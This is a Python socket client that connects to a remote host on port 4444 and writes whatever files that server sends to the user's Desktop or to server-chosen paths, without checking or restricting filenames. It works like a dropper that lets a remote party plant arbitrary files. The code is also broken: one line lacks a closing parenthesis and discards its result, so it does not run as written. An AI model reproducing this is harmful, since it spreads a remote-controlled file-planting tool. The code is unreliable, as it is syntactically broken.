import socket, os, urllib3

BUFFER_SIZE=4096
SEPARATOR= "<SEPARATOR>"
http=urllib3.PoolManager()
s = socket.socket()
host = "syncup.thatonetechcrew.net"
port = 4444

try:
    if "Desktop" in os.listdir(os.environ["USERPROFILE"]+"\\OneDrive".format(os.getlogin())):
        folderToAddToPath = os.environ["USERPROFILE"]+"\\OneDrive\\Desktop".format(os.getlogin())
    else:
        folderToAddToPath = os.environ["USERPROFILE"]+"\\Desktop".format(os.getlogin())
except:
    folderToAddToPath = os.environ["USERPROFILE"]+"\\Desktop".format(os.getlogin())
CWD=os.getcwd()
if True:
    print(f"[*] Connecting to {host}:{port}")
    s.connect((host, port))
    print("[*] Connected")
    USER_AUTH = "ALPHA_VERSION_PLACEBO_HASH"
    s.send(f"{USER_AUTH}".encode())
    print("Credentials sent...")
    if True:
        while True:
            try:
                print("Waiting for metadata...")
                received = s.recv(BUFFER_SIZE).decode()
                print("Metadata received.")
                filename, filesize = received.split(SEPARATOR)
                filename = filename.replace("<NEWFOLDER>", folderToAddToPath)
                filesize = int(filesize)
                s.send(b"<ENDFILEMETADATA>")
            except ValueError:
                s.send(b"<CONFIRMFILETRANSFERCOMPLETE>")
                if s.recv(BUFFER_SIZE) == b"<FILETRANSFERCOMPLETE>":
                    break
                else:
                    print("uh oh")
            print(f"Receiving {filename}")
            if filename == 'TARGET_IP_ADDRESS':
                pass
            else:
                with open(filename, "wb") as f:
                    print(f"Writing {filename}")
                    while True:
                        bytes_read = s.recv(BUFFER_SIZE)
                        bytes_read.replace(b"\00",b""
                        if not bytes_read:
                            break
                        elif b"\01\01\01\01" in bytes_read:
                            s.send(b"<FILEBREAK>")
                            if s.recv(BUFFER_SIZE) == b"<FILEBREAK>":
                                print(f"Finished writing {filename}")
                                break
                        else:
                            f.write(bytes_read)
        s.close()
        print("Sockets closed... shut down")
